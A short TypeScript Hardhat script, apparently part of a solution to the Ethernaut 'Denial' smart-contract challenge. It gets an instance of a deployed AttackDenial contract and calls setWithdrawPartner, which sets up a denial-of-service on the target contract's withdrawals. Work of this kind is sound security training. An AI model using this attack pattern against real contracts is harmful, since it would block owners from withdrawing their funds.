import { deployments, ethers } from "hardhat";
import { Address, Deployment } from "hardhat-deploy/types";
import { AttackDenial, Denial } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
    // Fetching the deployer signer
    const [deployer] = await ethers.getSigners();

    // Fetching contract instances
    const denialAddress: Address = "0x6Ca2A9dcFEaF64d7A8d871479930a58139a22DDE";
    const denial: Denial = await ethers.getContractAt("Denial", denialAddress, deployer);
    // 🛡 Getting the AttackDenial contract instance
    const attackDenialDeploy: Deployment = await deployments.get("AttackDenial");
    const attackDenial: AttackDenial = await ethers.getContractAt("AttackDenial", attackDenialDeploy.address, deployer);

    // Executing transactions
    let tx = await attackDenial.setWithdrawPartner();
    console.log(tx);
}

// 🔄 Running the main function and catching potential errors
main().catch(error => {
  console.error('🔥 An error occurred:', error);
});
